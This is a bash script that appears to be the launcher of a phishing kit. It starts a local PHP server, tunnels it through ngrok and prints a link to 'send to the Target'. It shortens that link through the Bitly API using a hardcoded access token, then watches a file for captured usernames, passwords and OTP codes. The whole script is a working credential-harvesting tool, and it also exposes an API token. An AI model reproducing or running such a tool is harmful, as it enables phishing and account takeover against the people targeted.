
echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
sleep 3
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m <<>> \e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
./ngrok http 4444 > /dev/null 2>&1 &
sleep 10
echo ""
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
echo ""
# BITLY CODES
printf "\n"
longurl=$link
Accesstoken=81afc11defe28d0a84edff9fd10606d3bacfe0e3
api=https://api-ssl.bitly.com/v4/shorten 
# If no URL you will see this Alert message 
if [[ ! $longurl ]]; 
then echo -e "Error URL Missing" 
exit 1 
fi 
# Curl request 
rem=$(curl -s -H Authorization:\ $Accesstoken -H Content-Type: -d '{"long_url": "'"$longurl"\"} $api |jq -j .link)
echo "Or use this link:    $rem"
termux-open-url $rem

# END BITLY
echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
echo ""
tail -f usernames.txt | grep -e "username" -e "password" -e "OTP"                 
